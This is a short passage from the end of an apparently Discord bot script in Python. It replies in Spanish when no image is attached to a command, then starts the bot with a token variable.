    else:
        await ctx.send("No se adjuntó ninguna imagen.")

bot.run(TOKEN)
